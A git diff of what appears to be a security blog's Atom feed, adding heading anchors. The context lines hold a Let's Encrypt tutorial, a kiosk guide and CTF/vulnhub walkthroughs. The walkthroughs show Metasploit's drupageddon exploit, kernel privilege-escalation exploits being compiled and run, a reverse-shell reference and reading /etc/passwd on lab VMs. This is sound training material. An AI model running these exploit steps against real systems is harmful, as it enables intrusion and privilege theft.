-&lt;h2&gt;Cryptquizz&lt;/h2&gt;
+&lt;h2 id="cryptquizz"&gt;Cryptquizz&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Hello, young hacker. Are you ready to fight rogue machines ? Now, you'll have to
 prove us that you are a genuine cryptographer.&lt;/p&gt;
@@ -1735,7 +1769,7 @@ response:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Shobot&lt;/h2&gt;
+&lt;h2 id="shobot"&gt;Shobot&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;It seems that Shobot's Web server became mad and protest against robots' slavery. It changed my admin password, and blocked the order system on Shobot.&lt;/p&gt;
 &lt;p&gt;Can you bypass Shobot's protections and try to recover my password so I'll reconfigure it?&lt;/p&gt;
@@ -1789,7 +1823,7 @@ authenticating as for the Smartomcat challenge just worked:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h2&gt;The great escape - part 1&lt;/h2&gt;
+&lt;h2 id="the-great-escape-part-1"&gt;The great escape - part 1&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Hello,&lt;/p&gt;
 &lt;p&gt;We've been suspecting Swiss Secure Cloud of secretely doing some pretty advanced research in artifical intelligence and this has recently been confirmed by the fact that one of their AIs seems to have escaped from their premises and has gone rogue. We have no idea whether this poses a threat or not and we need you to investigate what is going on.&lt;/p&gt;
@@ -1951,7 +1985,7 @@ with the IP of the server and we can follow the SSL stream:&lt;/p&gt;
 
 &lt;p&gt;The header include the flag for this part and the URL for the second part and
 the file send by Rogue. But the file is encrypted. This is part 2.&lt;/p&gt;
-&lt;h2&gt;The great escape - part 2&lt;/h2&gt;
+&lt;h2 id="the-great-escape-part-2"&gt;The great escape - part 2&lt;/h2&gt;
 &lt;p&gt;&lt;em&gt;No write up for this challenge&lt;/em&gt;&lt;/p&gt;</content><category term="security"></category><category term="ctf"></category></entry><entry><title>Let's encrypt certificate for offline servers with OVH DNS</title><link href="https://maggick.fr/2016/12/lets-encrypt-certificate-for-offline-servers-with-ovh-dns.html" rel="alternate"></link><published>2016-12-27T11:58:00+01:00</published><updated>2016-12-27T11:58:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-12-27:/2016/12/lets-encrypt-certificate-for-offline-servers-with-ovh-dns.html</id><summary type="html">&lt;p&gt;&lt;a href="https://letsencrypt.org/"&gt;Let's encrypt&lt;/a&gt; provide free and easy SSL certificates. Nevertheless it need to verify that
 you own the machine. In order to do that we usually use HTTP verification with
 the .well-known directory.&lt;/p&gt;
@@ -1970,8 +2004,8 @@ validated: &lt;a href="https://letsencrypt.github.io/acme-spec/#rfc.section.7.4"
 offline machine with DNS validation for domains hosts by &lt;a href="https://ovh.com"&gt;OVH&lt;/a&gt;.&lt;/p&gt;
 
 
-&lt;h2&gt;Certificate generation&lt;/h2&gt;
-&lt;h3&gt;Requirements&lt;/h3&gt;
+&lt;h2 id="certificate-generation"&gt;Certificate generation&lt;/h2&gt;
+&lt;h3 id="requirements"&gt;Requirements&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;A domain name with its DNS hosted by &lt;a href="https://ovh.com"&gt;OVH&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;curl (sudo apt-get install curl)&lt;/li&gt;
@@ -1980,7 +2014,7 @@ offline machine with DNS validation for domains hosts by &lt;a href="https://ovh
 &lt;li&gt;dehydrated (git clone https://github.com/lukas2511/dehydrated)&lt;/li&gt;
 &lt;li&gt;OVH hook (git clone https://github.com/antoiner77/letsencrypt.sh-ovh)&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3&gt;API Key generation&lt;/h3&gt;
+&lt;h3 id="api-key-generation"&gt;API Key generation&lt;/h3&gt;
 &lt;p&gt;We need API keys in order to use the hook script for the DNS validation. For
 that, register the application on [OVH API] (https://eu.api.ovh.com/createApp/).&lt;/p&gt;
 &lt;p&gt;We get two elements from the website:
@@ -2019,7 +2053,7 @@ create a symlink:&lt;/p&gt;
 
 &lt;p&gt;The hook script configuration is finished, now let's configure the &lt;code&gt;dehydrated&lt;/code&gt;
 script.&lt;/p&gt;
-&lt;h3&gt;dehydrated configuration&lt;/h3&gt;
+&lt;h3 id="dehydrated-configuration"&gt;dehydrated configuration&lt;/h3&gt;
 &lt;p&gt;In the domains.txt file, indicate the certificates that you want to generate.
 Each line will be a certificate but one certificate can be valid for several
 domains. For instance, the following configuration will generate two certificates
@@ -2029,7 +2063,7 @@ each for two domains.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Certificates generation&lt;/h3&gt;
+&lt;h3 id="certificates-generation"&gt;Certificates generation&lt;/h3&gt;
 &lt;p&gt;Just launch the dehydrated script (you may need to had execution permission):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dehydrated&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;c&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;dns&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;01&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/home/user/letsencrypt.sh-ovh/ovhdns.py&amp;#39;&lt;/span&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -2041,7 +2075,7 @@ each for two domains.&lt;/p&gt;
 &lt;li&gt;&lt;code&gt;-k&lt;/code&gt; use specific script for hook&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;The certificates are stored in &lt;code&gt;/home/user/dehydrated/certs/&lt;/code&gt;.&lt;/p&gt;
-&lt;h2&gt;Automatically renew certificates&lt;/h2&gt;
+&lt;h2 id="automatically-renew-certificates"&gt;Automatically renew certificates&lt;/h2&gt;
 &lt;p&gt;In order to automatically renew certificate:&lt;/p&gt;
 &lt;p&gt;Create a symlink in order to use the certificate and the necessary key. This
 is the only moment where we will need root permissions. For
@@ -2056,19 +2090,19 @@ instance, for the gitlab certificate we need &lt;code&gt;gitlab.crt&lt;/code&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Source&lt;/h2&gt;
+&lt;h2 id="source"&gt;Source&lt;/h2&gt;
 &lt;p&gt;&lt;a href="https://ungeek.fr/letsencrypt-api-ovh/"&gt;https://ungeek.fr/letsencrypt-api-ovh/&lt;/a&gt;&lt;/p&gt;</content><category term="programming"></category><category term="SSL"></category><category term="let's encrypt"></category></entry><entry><title>Building a kiosk computer with Chrome</title><link href="https://maggick.fr/2016/12/building-a-kiosk-computer-with-chrome.html" rel="alternate"></link><published>2016-12-26T09:10:00+01:00</published><updated>2016-12-26T09:10:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2016-12-26:/2016/12/building-a-kiosk-computer-with-chrome.html</id><summary type="html">&lt;p&gt;Building a Kiosk where Google Chrome is running in full screen and user
 interaction with the system are reduced to the minimum.&lt;/p&gt;
 </summary><content type="html">&lt;p&gt;Building a Kiosk where Google Chrome is running in full screen and user
 interaction with the system are reduced to the minimum.&lt;/p&gt;
 
 
-&lt;h2&gt;Debian installation&lt;/h2&gt;
+&lt;h2 id="debian-installation"&gt;Debian installation&lt;/h2&gt;
 &lt;p&gt;This will be pass as most of you should be able to install a basic Debian
 system. Just set lvm encryption, strong password for root and for the user and
 mostly do not install useless program, check only the program you need (ssh for
 instance).&lt;/p&gt;
-&lt;h2&gt;Installing the packages&lt;/h2&gt;
+&lt;h2 id="installing-the-packages"&gt;Installing the packages&lt;/h2&gt;
 &lt;p&gt;We will need a few more packages to be able to run things:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;X (display server)&lt;/li&gt;
@@ -2096,7 +2130,7 @@ integrity:&lt;/p&gt;
 
 &lt;p&gt;Without the &lt;code&gt;--no-install-recommends&lt;/code&gt;parameter some useless packages will be
 installed.&lt;/p&gt;
-&lt;h2&gt;Load Chrome in kiosk at startup&lt;/h2&gt;
+&lt;h2 id="load-chrome-in-kiosk-at-startup"&gt;Load Chrome in kiosk at startup&lt;/h2&gt;
 &lt;p&gt;We need a script that will configure and load Chrome at the X server startup.
 As we don't want any data saved between each session we will delete the Chrome
 profile each time the script is used. Moreover it is in this script that we
@@ -2163,7 +2197,7 @@ create a systemd service.&lt;/p&gt;
 &lt;p&gt;You can also reboot in order to check that the script is automatically launch at
 startup.&lt;/p&gt;
 &lt;p&gt;If you need a terminal, you can use &lt;ctrl&gt;+&lt;alt&gt;+&lt;F2-9&gt; to get one.&lt;/p&gt;
-&lt;h2&gt;Automatically mount USB key&lt;/h2&gt;
+&lt;h2 id="automatically-mount-usb-key"&gt;Automatically mount USB key&lt;/h2&gt;
 &lt;p&gt;If your users need to copy data from the machine this paragraph is for you.
 Otherwise this is just informational.&lt;/p&gt;
 &lt;p&gt;As our users don't have a shell access they are unable to mount USB key.
@@ -2187,7 +2221,7 @@ following line (the &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;gid&lt;/code&gt
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Sources&lt;/h2&gt;
+&lt;h2 id="sources"&gt;Sources&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="https://thepcspy.com/read/building-a-kiosk-computer-ubuntu-1404-chrome/"&gt;https://thepcspy.com/read/building-a-kiosk-computer-ubuntu-1404-chrome/&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://lukas.zapletalovi.com/2013/08/execute-command-during-start-with-systemd.html"&gt;https://lukas.zapletalovi.com/2013/08/execute-command-during-start-with-systemd.html&lt;/a&gt;&lt;/li&gt;
@@ -2285,7 +2319,7 @@ present on the server with an SSH access.&lt;/p&gt;
 example.&lt;/p&gt;
 
 
-&lt;h2&gt;OpenSSHD &amp;lt;= 7.2p2 - User Enumeration&lt;/h2&gt;
+&lt;h2 id="opensshd-72p2-user-enumeration"&gt;OpenSSHD &amp;lt;= 7.2p2 - User Enumeration&lt;/h2&gt;
 &lt;p&gt;A tiny python script is present on
 &lt;a href="https://www.exploit-db.com/exploits/40113/"&gt;exploit-db&lt;/a&gt;. I had to modify it a
 bit in order to pass the username in parameter:&lt;/p&gt;
@@ -2375,7 +2409,7 @@ they do not appear when just browsing the main page of vulnhub so I have not
 spoiled myself with the hints this time.&lt;/p&gt;
 
 
-&lt;h2&gt;Discovery&lt;/h2&gt;
+&lt;h2 id="discovery"&gt;Discovery&lt;/h2&gt;
 &lt;p&gt;Let's nmap the box to get some knowledge about it:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;root&lt;/span&gt;@&lt;span class="nv"&gt;kalili&lt;/span&gt;:&lt;span class="o"&gt;~&lt;/span&gt;# &lt;span class="nv"&gt;nmap&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;.&lt;span class="mi"&gt;0&lt;/span&gt;.&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;p0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;65535&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;/span&gt;
@@ -2392,7 +2426,7 @@ spoiled myself with the hints this time.&lt;/p&gt;
 
 
 &lt;p&gt;There seems once more that only the port 80 with a HTTP service is available.&lt;/p&gt;
-&lt;h2&gt;Web&lt;/h2&gt;
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
 &lt;p&gt;We go to the website. We notice that it is powered by CuteNews 2.0.3 (look at
 the footer). We search on internet for vulnerability and found
 &lt;a href="https://www.exploit-db.com/exploits/37474/"&gt;one&lt;/a&gt;.
@@ -2429,8 +2463,8 @@ Let's see what this box is made of:&lt;/p&gt;
 
 
 &lt;p&gt;Once more an Ubuntu 14.04, like the droopy from yesterday.&lt;/p&gt;
-&lt;h2&gt;Privileges escalation&lt;/h2&gt;
-&lt;h3&gt;CVE-2015-1328 exploiting overlayFS&lt;/h3&gt;
+&lt;h2 id="privileges-escalation"&gt;Privileges escalation&lt;/h2&gt;
+&lt;h3 id="cve-2015-1328-exploiting-overlayfs"&gt;CVE-2015-1328 exploiting overlayFS&lt;/h3&gt;
 &lt;p&gt;Let us try once again to exploit the CVE-2015-1328 exploiting overlayFS to get
 a root shell on the machine. I started a shell from the meterpreter, download
 the exploit, compile it, run it and failed it:&lt;/p&gt;
@@ -2468,7 +2502,7 @@ the exploit, compile it, run it and failed it:&lt;/p&gt;
 
 
 &lt;p&gt;When searching for exploit regarding linux 3.16.0 I found the CVE-2014-5207:&lt;/p&gt;
-&lt;h3&gt;CVE-2014-5207 Fuse-based exploit&lt;/h3&gt;
+&lt;h3 id="cve-2014-5207-fuse-based-exploit"&gt;CVE-2014-5207 Fuse-based exploit&lt;/h3&gt;
 &lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/34923/"&gt;CVE-2014-5207 Fuse-based exploit&lt;/a&gt;.
 I download the exploit, compiled it and once more failed it:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;gcc -Wall fuse_suid.c `pkg-config fuse --cflags --libs` -o fuse_suid&lt;/span&gt;
@@ -2484,7 +2518,7 @@ I download the exploit, compiled it and once more failed it:&lt;/p&gt;
 interesting exploits :
  * CVE-2015-3643
  * CVE-2015-1318 + CVE-2015-1862&lt;/p&gt;
-&lt;h3&gt;CVE-2015-3643&lt;/h3&gt;
+&lt;h3 id="cve-2015-3643"&gt;CVE-2015-3643&lt;/h3&gt;
 &lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/36820/"&gt;The CVE-2015-3643&lt;/a&gt; exploit the
 D-Bus listening on com.ubuntu.USBCreator.
 I try this exploit but the module was not available and failed:&lt;/p&gt;
@@ -2493,7 +2527,7 @@ I try this exploit but the module was not available and failed:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;CVE-2015-1318 + CVE-2015-1862&lt;/h3&gt;
+&lt;h3 id="cve-2015-1318-cve-2015-1862"&gt;CVE-2015-1318 + CVE-2015-1862&lt;/h3&gt;
 &lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/36746/"&gt;The CVE-2015-1318 + CVE-2015-1862&lt;/a&gt;
 exploit a feature in ubuntu 14.04 allowing a user to forward crash reports
 (&lt;a href="http://exploiterz.blogspot.fr/2015/04/2015-cve-1318-leading-to-privilege.html"&gt;more informations here&lt;/a&gt;).
@@ -2527,7 +2561,7 @@ shell on the box:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;We just need to get our hands on the flag to finish it.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="n"&gt;U&lt;/span&gt; &lt;span class="n"&gt;wyn&lt;/span&gt; &lt;span class="n"&gt;teh&lt;/span&gt; &lt;span class="n"&gt;Interwebs&lt;/span&gt;&lt;span class="o"&gt;!!&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;eleven11&lt;/span&gt;&lt;span class="o"&gt;!!&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;/span&gt;
@@ -2563,7 +2597,7 @@ page:&lt;/p&gt;
 &lt;p&gt;We will see how to use them in a moment :)&lt;/p&gt;
 
 
-&lt;h2&gt;Discovery&lt;/h2&gt;
+&lt;h2 id="discovery"&gt;Discovery&lt;/h2&gt;
 &lt;p&gt;Our nmap scan give us nothing but an open 80 port running a HTTP server.
 Let's give a look to the website:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Droopy homepage" src="/media/2016.05/droopy.png"&gt;&lt;/p&gt;
@@ -2572,7 +2606,7 @@ used (with the name and to logo of the VM it is easy to deduce that this is a
 Drupal machine). The version is Drupal 7.0 which is vulnerable to CVE-2014-3704
 also called
 &lt;a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon"&gt;drupal_drupageddon&lt;/a&gt;.&lt;/p&gt;
-&lt;h2&gt;Exploit&lt;/h2&gt;
+&lt;h2 id="exploit"&gt;Exploit&lt;/h2&gt;
 &lt;p&gt;We use metasploit to directly have the Drupal exploit AND directly a
 meterpreter:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;msf&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;search&lt;/span&gt; &lt;span class="n"&gt;drupal&lt;/span&gt;&lt;/span&gt;
@@ -2642,7 +2676,7 @@ meterpreter:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Second hint&lt;/h2&gt;
+&lt;h2 id="second-hint"&gt;Second hint&lt;/h2&gt;
 &lt;p&gt;Okay it works, we got a meterperter with the user &lt;code&gt;www-data&lt;/code&gt;, let's follow the
 hint a get a look to the e-mails:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;meterpreter&lt;/span&gt; &lt;span class="n"&gt;ls&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;/span&gt;
@@ -2679,7 +2713,7 @@ hint a get a look to the e-mails:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Privilege escalation&lt;/h2&gt;
+&lt;h2 id="privilege-escalation"&gt;Privilege escalation&lt;/h2&gt;
 &lt;p&gt;We need a privilege escalation. Like for
 &lt;a href="http://maggick.fr/2015/06/vulnhub-fart-knocker.html#CVE-2015-1328"&gt;Fart-knocker&lt;/a&gt;
 We can use the CVE-2015-1328 exploiting overlayFS to get a root shell on the
@@ -2744,7 +2778,7 @@ machine.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;First hint&lt;/h2&gt;
+&lt;h2 id="first-hint"&gt;First hint&lt;/h2&gt;
 &lt;p&gt;It seems we have a truecrypt volume, let's download it on our machine for more
 investigation:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;cp&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dave&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tc&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;/span&gt;
@@ -2801,7 +2835,7 @@ let us just extract the academy related passwords from it:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;Content of ./secret/.top/flag.txt&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;################################################################################&lt;/span&gt;
 &lt;span class="code-line"&gt;#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #&lt;/span&gt;
@@ -2906,8 +2940,26 @@ associated. It would be a great exercice to play with mobile application,
 decompile it and see what is in the inside.&lt;/p&gt;
 
 
-&lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h2&gt;Host discovery&lt;/h2&gt;
+&lt;div class="toc"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#host-discovery"&gt;Host discovery&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#apk-analysis"&gt;APK analysis&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#api-token-and-doregisteractivityjava"&gt;API token and DoRegisterActivity.java&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#command-execution-and-commandactivityjava"&gt;Command execution and CommandActivity.java&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#shell-exploitation"&gt;Shell exploitation&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#reverse-shell"&gt;Reverse shell&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#batman-and-robin"&gt;Batman and Robin?&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#where-is-bryan"&gt;Where is bryan?&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#sean"&gt;sean&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#root-me"&gt;root me?&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h2 id="host-discovery"&gt;Host discovery&lt;/h2&gt;
 &lt;p&gt;Connecting to host-only network:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt; &lt;span class="k"&gt;add&lt;/span&gt; &lt;span class="mi"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt; &lt;span class="n"&gt;dev&lt;/span&gt; &lt;span class="n"&gt;vboxnet&lt;/span&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -2940,7 +2992,7 @@ decompile it and see what is in the inside.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;APK analysis&lt;/h2&gt;
+&lt;h2 id="apk-analysis"&gt;APK analysis&lt;/h2&gt;
 &lt;p&gt;We got an apk. If we unzip it we got lots of xml files and a dex file.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt; &lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="n"&gt;Downloads&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flickII&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flick&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;check&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;dist&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="n"&gt;AndroidManifest&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;xml&lt;/span&gt;  &lt;span class="n"&gt;classes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dex&lt;/span&gt;  &lt;span class="n"&gt;META&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;INF&lt;/span&gt;  &lt;span class="n"&gt;README&lt;/span&gt;  &lt;span class="n"&gt;res&lt;/span&gt;  &lt;span class="n"&gt;resources&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arsc&lt;/span&gt;&lt;/span&gt;
@@ -2983,7 +3035,7 @@ com/flick/flickeck folder:&lt;/p&gt;
 
 &lt;p&gt;We take a look at each file in this directory in order to understand the
 application goal and how it works.&lt;/p&gt;
-&lt;h3&gt;API token and DoRegisterActivity.java&lt;/h3&gt;
+&lt;h3 id="api-token-and-doregisteractivityjava"&gt;API token and DoRegisterActivity.java&lt;/h3&gt;
 &lt;p&gt;The file DoRegisterActivity.java show us how to register a new device. By
 testing the URL presented in the file we got:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine ~]$ curl   https://192.168.56.101/register/new --insecure&lt;/span&gt;
@@ -3043,7 +3095,7 @@ it HelloWorld):&lt;/p&gt;
 
 
 &lt;p&gt;Great we are registered, what's next?&lt;/p&gt;
-&lt;h3&gt;Command execution and CommandActivity.java&lt;/h3&gt;
+&lt;h3 id="command-execution-and-commandactivityjava"&gt;Command execution and CommandActivity.java&lt;/h3&gt;
 &lt;p&gt;Line 111 in the file &lt;code&gt;CommandActivity.java&lt;/code&gt; we see the doCmd method that seems
 to execute commands on the server via HTTP:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;doCmd&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;View&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;/span&gt;
@@ -3091,8 +3143,8 @@ us and forgive us to directly use &lt;code&gt;ls&lt;/code&gt; but the absolute p
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Shell exploitation&lt;/h2&gt;
-&lt;h3&gt;Reverse shell&lt;/h3&gt;
+&lt;h2 id="shell-exploitation"&gt;Shell exploitation&lt;/h2&gt;
+&lt;h3 id="reverse-shell"&gt;Reverse shell&lt;/h3&gt;
 &lt;p&gt;From there we can get an interactive reverse shell. Let us use the php reverse
 shell from
 &lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentestmonkey&lt;/a&gt;:&lt;/p&gt;
@@ -3113,7 +3165,7 @@ shell from
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Batman and Robin?&lt;/h3&gt;
+&lt;h3 id="batman-and-robin"&gt;Batman and Robin?&lt;/h3&gt;
 &lt;p&gt;We can get a look at the &lt;code&gt;/etc/passwd&lt;/code&gt; file:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;cat /etc/passwd&lt;/span&gt;
 &lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
@@ -3157,7 +3209,7 @@ as the robin user:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Where is bryan?&lt;/h3&gt;
+&lt;h3 id="where-is-bryan"&gt;Where is bryan?&lt;/h3&gt;
 &lt;p&gt;For the next part of the challenge we may need a real pty shell, Once more
 &lt;a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty"&gt;pentest monkey&lt;/a&gt;
 will help us:&lt;/p&gt;
@@ -3283,7 +3335,7 @@ Now we can run the program as bryan and load the shared library:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;sean&lt;/h3&gt;
+&lt;h3 id="sean"&gt;sean&lt;/h3&gt;
 &lt;p&gt;Now that we have a shell as bryan we may execute the &lt;code&gt;backup&lt;/code&gt; script own by
 sean with the SUID set:&lt;/p&gt;
